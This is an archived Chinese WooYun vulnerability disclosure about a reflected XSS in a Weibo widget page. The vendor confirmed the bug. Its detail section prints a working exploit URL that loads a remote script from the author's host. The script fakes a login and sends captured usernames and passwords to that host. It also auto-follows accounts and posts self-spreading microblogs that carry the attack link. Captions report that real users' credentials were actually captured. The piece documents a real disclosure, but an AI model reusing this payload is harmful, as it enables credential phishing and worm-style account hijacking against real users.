@@ -1,0 +1,256 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		微博某常用页面反射型XSS(已钓鱼+关注+发微博)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		微博某常用页面反射型XSS(已钓鱼+关注+发微博)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Millet">Millet</a> 
+</li><li>提交时间：		2013-05-08 11:45</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-08：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-08：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-18：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-28：	细节向普通白帽子公开<br/>
+									2013-06-07：	细节向实习白帽子公开<br/>
+									2013-06-22：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">某常用页面的参数未过滤，附XSS利用过程。<br />
+已帮忙关注乌云了，大家也来关注一下吧~~<br />
+安全意识高的人越来越多了，看到weibo.com的域名也不点，反射型的XSS真心难，求持久化思路。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1.http://widget.weibo.com/dialog/follow.php 加关注页面，vsrc参数未过滤。<br />
+<br />
+2.http://widget.weibo.com/dialog/follow.php?fuid=1922455660&amp;refer=&amp;language=zh_cn&amp;type=widget_page&amp;vsrc=app_followbutton%27%7D%3Bonload=function%28%29%7BSTK.scriptLoader%28%7Burl%3A%27http%3A%2F%2Fmxss.sinaapp.com%2Ffish.js%27%7D%29%7D%3Bb%3D%7Ba%3A%27<br />
+<br />
+</p><p class="detail"><a href="../images/0810553451025ae3c5bfc6a1745708d4d2361231.jpg" target="_blank"><img src="../images/0810553451025ae3c5bfc6a1745708d4d2361231.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+3.该页面有登录框，就不用自己写登录框了:)。<br />
+<br />
+</p><pre><code>/*<br />
+进来后提交关注和发送微博，并点击“换个账号按钮”，显示登录框；<br />
+给登录按钮和回车事件增加了发到g.php的动作；<br />
+STK.jsonp来提交到g.php，STK.ajax来关注和发微博；<br />
+后来又增加了发微话题，这个是有检查referer的，所以用一个iframe来做。<br />
+*/<br />
+var xss_url = &quot;http://widget.weibo.com/dialog/follow.php?fuid=1922455660&amp;refer=&amp;language=zh_cn&amp;type=widget_page&amp;vsrc=app_followbutton%27%7D%3Bonload=function%28%29%7BSTK.scriptLoader%28%7Burl%3A%27http%3A%2F%2Fmxss.sinaapp.com%2Ffish.js%27%7D%29%7D%3Bb%3D%7Ba%3A%27&amp;r=&quot;+Math.random();<br />
+var blogs = [&#039;[BOBO害羞]看我如何一夜粉丝十万：&#039;,<br />
+		&#039;有什么新鲜事想告诉大家？&#039;,<br />
+		&#039;[lt切克闹]唷唷，切克闹。&#039;,<br />
+		&#039;马刺VS勇士，加时赛。&#039;,<br />
+		&#039;太贫困的人是不能重用，俗话说好日子过惯了难过穷日子。&#039;,<br />
+		&#039;人们常常用咄咄逼人来掩饰弱点，只有软骨头才急躁粗暴，他们因此丧失了人的尊严。&#039;,<br />
+		&#039;我等待，我观看。恩惠也许来，也许不来。&#039;,<br />
+		&#039;也许这种既平静又不平静的等待就是恩惠的使者，或恩惠本身。&#039;,<br />
+		&#039;京华记者现场对阵农夫山泉，8问8答激辩。&#039;,<br />
+		&#039;爆灯姐丁东丽遭吐槽。&#039;,<br />
+		&#039;淘宝客：中小卖家淘宝客运营实战篇。&#039;,<br />
+		&#039;我们中出了2个叛徒，必须烧死。[蜡烛][蜡烛][蜡烛]&#039;,<br />
+		&#039;次奥，这个炸弹两面都有胶！[崩溃]&#039;,<br />
+		&#039;我不行了，这是我的申请书......&#039;,<br />
+		&#039;敌人叫我们投降，我从了&#039;,<br />
+		&#039;炸弹已安置完毕，请求撤离。队长，队长？&#039;<br />
+		];<br />
+var blog = blogs[Math.floor(Math.random()*blogs.length+1)];<br />
+var topic = &quot;#报告队长#&quot;;<br />
+var logout_link = document.getElementsByClassName(&quot;logout_link&quot;)[0];<br />
+function m_post(){<br />
+	//show fish form<br />
+	if(logout_link) logout_link.click();<br />
+	//follow wooyun<br />
+	STK.ajax({url:&quot;/relationship/aj_attention.php&quot;,method:&#039;post&#039;,args:{uid:1981622273},<br />
+		onComplete:function(){<br />
+			//follow me<br />
+			STK.ajax({url:&quot;/relationship/aj_attention.php&quot;,method:&#039;post&#039;,args:{uid:1922455660},<br />
+			onComplete:function(){<br />
+				//add blog<br />
+				STK.ajax({url:&quot;/public/aj_addMblog.php&quot;,method:&#039;post&#039;,args:{content:encodeURIComponent(blog+xss_url),appkey:1629860458},<br />
+				onComplete:function(){<br />
+					//create topic blog iframe<br />
+					var ifm = document.createElement(&quot;iframe&quot;);<br />
+					ifm.src = &quot;/livestream/listlive.php&quot;;<br />
+					ifm.style.display = &quot;none&quot;;<br />
+					ifm.id=&quot;m_topic_ifm&quot;;<br />
+					document.body.appendChild(ifm);<br />
+					//add topic blog<br />
+					ifm.onload = function(){<br />
+						ifm.contentWindow.STK.ajax({url:&quot;/livestream/addmblog.php&quot;,method:&#039;post&#039;,args:{content:encodeURIComponent(encodeURIComponent(topic+blog+xss_url)),appkey:2191225368,refer:&#039;www.google.com.hk&#039;,language:&#039;zh_cn&#039;,url_param:&#039;&#039;,_t:0}});<br />
+					}<br />
+				}});<br />
+			}});<br />
+		}});<br />
+}<br />
+<br />
+//fish<br />
+var m_submit = document.getElementsByClassName(&quot;submit_login_btn WB_btnD&quot;)[0];<br />
+if(m_submit){<br />
+	m_submit.onclick = function(){<br />
+		var name = document.getElementsByClassName(&quot;WB_input input_account&quot;)[0].value;<br />
+		var pass = document.getElementsByClassName(&quot;WB_input input_password&quot;)[0].value;<br />
+		STK.jsonp({url:&quot;http://mxss.sinaapp.com/g.php?n=&quot;+encodeURIComponent(name)+&quot;&amp;p=&quot;+encodeURIComponent(pass)});<br />
+		//post again<br />
+		setTimeout(function(){m_post()},2000);<br />
+	}<br />
+	document.onkeydown = function(e){<br />
+		var num = (e!=undefined)?e.keyCode:window.event.keyCode;<br />
+		if(num == 13){<br />
+			m_submit.onclick();<br />
+		}<br />
+	}<br />
+}<br />
+<br />
+m_post();</code></pre><p class='detail'><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">一进来就有提交<br />
+<br />
+</p><p class="detail"><a href="../images/0811011926e1b619d3b5c7c0983a47f7b05ae719.jpg" target="_blank"><img src="../images/0811011926e1b619d3b5c7c0983a47f7b05ae719.jpg" alt="XSS页面.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+输入密码后提交并再次关注下</p><p class="detail"><a href="../images/081101532fa22ef46dd9207fd722e3edc6a648c1.jpg" target="_blank"><img src="../images/081101532fa22ef46dd9207fd722e3edc6a648c1.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+账号密码来咯</p><p class="detail"><a href="../images/08110323a3d7454ffc1eeb4e3a46aab42f57015a.jpg" target="_blank"><img src="../images/08110323a3d7454ffc1eeb4e3a46aab42f57015a.jpg" alt="sql.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+某人已关注并add blog</p><p class="detail"><a href="../images/08110343b1ea0e71dc97c2628342348c11a26c19.jpg" target="_blank"><img src="../images/08110343b1ea0e71dc97c2628342348c11a26c19.jpg" alt=".jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤噻。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Millet" title="Millet">Millet</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-023278" title="微博某常用页面反射型XSS(已钓鱼+关注+发微博)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-05-08 13:51</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢关注新浪安全，已进入内部修复流程。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="23278";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
